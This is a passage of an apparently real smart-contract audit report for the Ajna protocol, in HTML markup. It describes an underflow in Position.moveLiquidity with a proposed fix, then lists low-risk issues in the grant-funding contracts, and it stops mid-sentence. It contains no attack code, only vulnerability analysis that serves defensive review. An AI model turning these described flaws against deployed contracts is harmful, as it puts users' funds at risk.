class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expiry</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">toPosition</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toIndex</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// update position LP state</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountFrom</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">toPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\">   += </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountTo</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// update position deposit time to the from bucket deposit time</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">toPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MoveLiquidity</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toIndex</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountFrom</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountTo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>If lp position is worth more than when at deposit time based on amount of quote token moved which could likely be the case due to interest accrued or simply from exchange rates favoring quote token, <code>moveLiquidity</code> could revert due to underflow as <code>vars.lpbAmountFrom</code> could be greater than <code>fromPosition.lps</code> (i.e. <code>vars.lpbAmountFrom > fromPosition.lps</code>)</p>\n<p>Since call to <code>Position.moveLiquidity()</code> is supposed to move all lp positions attached to associated NFT within a bucket, we can simply delete the <code>fromPosition</code> mapping to remove bucket index at which a position has moved liquidity to prevent potential cases where <code>Position.moveLiquidity()</code> could revert due to underflow in this line:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"86\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountFrom</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h3 id=\"recommendation\" style=\"position:relative;\"><a href=\"#recommendation\" aria-label=\"recommendation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>LP tracked by position manager at bucket index should be deleted similar to <code>redeemPositions</code>, if not <code>Position.moveLiquidity</code> can likely underflow.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"87\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">moveLiquidity</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">MoveLiquidityParams</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mayInteract</span><span class=\"mtk1\">(params_.pool, params_.tokenId) </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// update position LP state</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountFrom</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">toPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\">   += </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountTo</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// update position deposit time to the from bucket deposit time</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">toPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">++  </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MoveLiquidity</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toIndex</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountFrom</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountTo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/99#issuecomment-1555081319\">MikeHathaway (Ajna) confirmed</a></strong></p>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this audit, 39 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/299\">report highlighted below</a> by <strong>rbserver</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/499\">MohammedRizwan</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/497\">Bason</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/496\">lfzkoala</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/495\">naman1778</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/490\">pontifex</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/484\">yjrwkk</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/480\">teawaterwire</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/477\">Jerry0x</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/473\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/467\">DadeKuma</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/437\">REACH</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/434\">nadin</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/419\">lukris02</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/407\">GG_Security</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/404\">sakshamguruji</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/398\">descharre</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/375\">bytes032</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/359\">hals</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/330\">patitonar</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/300\">BGSecurity</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/283\">squeaky_cactus</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/278\">Shogoki</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/276\">wonjun</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/258\">T1MOH</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/255\">aviggiano</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/247\">fatherOfBlocks</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/243\">Audit_Avengers</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/211\">ayden</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/194\">UniversalCrypto</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/183\">ABAIKUNANBAEV</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/166\">0xnev</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/162\">berlin-101</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/153\">kodyvim</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/138\">codeslide</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/127\">Jorgect</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/56\">BRONZEDISC</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/41\">kaveyjoe</a>, and <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/23\">Sathish9098</a>.</em></p>\n<h2 id=\"qa-report\" style=\"position:relative;\"><a href=\"#qa-report\" aria-label=\"qa report permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>QA REPORT</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[01]</td>\n<td align=\"left\"><code>CHALLENGE_PERIOD_LENGTH</code>, <code>DISTRIBUTION_PERIOD_LENGTH</code>, <code>FUNDING_PERIOD_LENGTH</code>, AND <code>MAX_EFM_PROPOSAL_LENGTH</code> ARE HARDCODED BASED ON 7200 BLOCKS PER DAY</td>\n</tr>\n<tr>\n<td>[02]</td>\n<td align=\"left\">AMBIGUITY IN <code>StandardFunding._standardProposalState</code> FUNCTION</td>\n</tr>\n<tr>\n<td>[03]</td>\n<td align=\"left\"><code>ExtraordinaryFundingProposal.votesReceived</code> IN <code>ExtraordinaryFunding</code> CONTRACT IS <code>uint120</code> INSTEAD OF <code>uint128</code></td>\n</tr>\n<tr>\n<td>[04]</td>\n<td align=\"left\">CALLING <code>ExtraordinaryFunding.proposeExtraordinary</code> AND <code>StandardFunding.proposeStandard</code> FUNCTIONS CAN REVERT AND WASTE GAS</td>\n</tr>\n<tr>\n<td>[05]</td>\n<td align=\"left\">CODE COMMENT IN <code>ExtraordinaryFunding._extraordinaryProposalSucceeded</code> FUNCTION CAN BE INCORRECT</td>\n</tr>\n<tr>\n<td>[06]</td>\n<td align=\"left\">CODE COMMENT FOR <code>CHALLENGE_PERIOD_LENGTH</code> CAN BE MORE ACCURATE</td>\n</tr>\n<tr>\n<td>[07]</td>\n<td align=\"left\">SETTING <code>support</code> TO <code>1</code> WHEN <code>voteParams_.votesUsed &#x3C; 0</code> IS FALSE IN <code>StandardFunding._fundingVote</code> FUNCTION IS REDUNDANT</td>\n</tr>\n<tr>\n<td>[08]</td>\n<td align=\"left\">REDUNDANT EXECUTION OF <code>if (sumOfTheSquareOfVotesCast > type(uint128).max) revert InsufficientVotingPower()</code> IN <code>StandardFunding._fundingVote</code> FUNCTION</td>\n</tr>\n<tr>\n<td>[09]</td>\n<td align=\"left\"><code>InvalidVote</code> ERROR CAN BE MORE DESCRIPTIVE</td>\n</tr>\n<tr>\n<td>[10]</td>\n<td align=\"left\">UNDERSCORES CAN BE ADDED FOR NUMBERS</td>\n</tr>\n<tr>\n<td>[11]</td>\n<td align=\"left\"><code>uint256</code> CAN BE USED INSTEAD OF <code>uint</code></td>\n</tr>\n<tr>\n<td>[12]</td>\n<td align=\"left\">SPACES CAN BE ADDED FOR BETTER READABILITY</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"01-challenge_period_length-distribution_period_length-funding_period_length-and-max_efm_proposal_length-are-hardcoded-based-on-7200-blocks-per-day\" style=\"position:relative;\"><a href=\"#01-challenge_period_length-distribution_period_length-funding_period_length-and-max_efm_proposal_length-are-hardcoded-based-on-7200-blocks-per-day\" aria-label=\"01 challenge_period_length distribution_period_length funding_period_length and max_efm_proposal_length are hardcoded based on 7200 blocks per day permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[01] <code>CHALLENGE_PERIOD_LENGTH</code>, <code>DISTRIBUTION_PERIOD_LENGTH</code>, <code>FUNDING_PERIOD_LENGTH</code>, AND <code>MAX_EFM_PROPOSAL_LENGTH</code> ARE HARDCODED BASED ON 7200 BLOCKS PER DAY</h2>\n<p>The following <code>CHALLENGE_PERIOD_LENGTH</code>, <code>DISTRIBUTION_PERIOD_LENGTH</code>, <code>FUNDING_PERIOD_LENGTH</code>, and <code>MAX_EFM_PROPOSAL_LENGTH</code> are hardcoded and assume that the number of blocks per day is 7200 and the number of seconds per block is 12. Yet, it is possible that the number of seconds per block is more or less than 12 due to network traffic and future chain upgrades. When the number of seconds per block is no longer 12, the durations corresponding to <code>CHALLENGE_PERIOD_LENGTH</code>, <code>DISTRIBUTION_PERIOD_LENGTH</code>, <code>FUNDING_PERIOD_LENGTH</code>, and <code>MAX_EFM_PROPOSAL_LENGTH</code> are no longer 7, 90, 10, and 30 days, which break the duration specifications for various phases. This can cause unexpectedness to users; for example, when the duration for <code>FUNDING_PERIOD_LENGTH</code> becomes less than 10 days, a user, who expects that she or he could vote on the 10th day, can fail to vote unexpectedly on that 10th day. To avoid unexpectedness and disputes, please consider using <code>block.timestamp</code> instead of blocks for defining durations for various phases in the <code>StandardFunding</code> and <code>ExtraordinaryFunding</code> contracts.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L29-L34\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L29-L34</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"88\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> Length of the challengephase of the distribution period in blocks.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\">    Roughly equivalent to the number of blocks in 7 days.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\">    The period in which funded proposal slates can be checked in updateSlate.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CHALLENGE_PERIOD_LENGTH</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">50400</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L36-L40\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L36-L40</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"89\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> Length of the distribution period in blocks.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\">    Roughly equivalent to the number of blocks in 90 days.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint48</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">DISTRIBUTION_PERIOD_LENGTH</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">648000</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L42-L46\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L42-L46</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"90\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> Length of the funding phase of the distribution period in blocks.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\">    Roughly equivalent to the number of blocks in 10 days.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FUNDING_PERIOD_LENGTH</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">72000</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L20-L23\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L20-L23</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"91\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> The maximum length of a proposal&#39;s voting period, in blocks.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MAX_EFM_PROPOSAL_LENGTH</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">216_000</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// number of blocks in one month</span></span></span></code></pre>\n<h2 id=\"02-ambiguity-in-standardfunding_standardproposalstate-function\" style=\"position:relative;\"><a href=\"#02-ambiguity-in-standardfunding_standardproposalstate-function\" aria-label=\"02 ambiguity in standardfunding_standardproposalstate function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[02] AMBIGUITY IN <code>StandardFunding._standardProposalState</code> FUNCTION</h2>\n<p>When <code>block.number</code> is bigger than <code>_distributions[proposal.distributionId].endBlock</code>, it is possible that the proposal is in the challenge phase. In the challenge phase, calling the following <code>StandardFunding._standardProposalState</code> function, which further calls the <code>StandardFunding._standardFundingVoteSucceeded</code> function below, can return <code>ProposalState.Succeeded</code> if the proposal is found in <code>_fundedProposalSlates[_distributions[distributionId].fundedSlateHash]</code> at that moment. However, during the challenge phase, the <code>StandardFunding.updateSlate</code> function below can be called to update <code>_fundedProposalSlates</code> for the mentioned <code>_distributions[distributionId].fundedSlateHash]</code>. Such update can exclude the same proposal from <code>_fundedProposalSlates[_distributions[distributionId].fundedSlateHash]</code>; calling the <code>StandardFunding._standardProposalState</code> function again would then return <code>ProposalState.Defeated</code> for such proposal. Hence, the <code>StandardFunding._standardProposalState</code> function cannot properly determine the status of the corresponding proposal in the challenge phase. To prevent users from being misled, please update the <code>StandardFunding._standardProposalState</code> function to return a state, which is 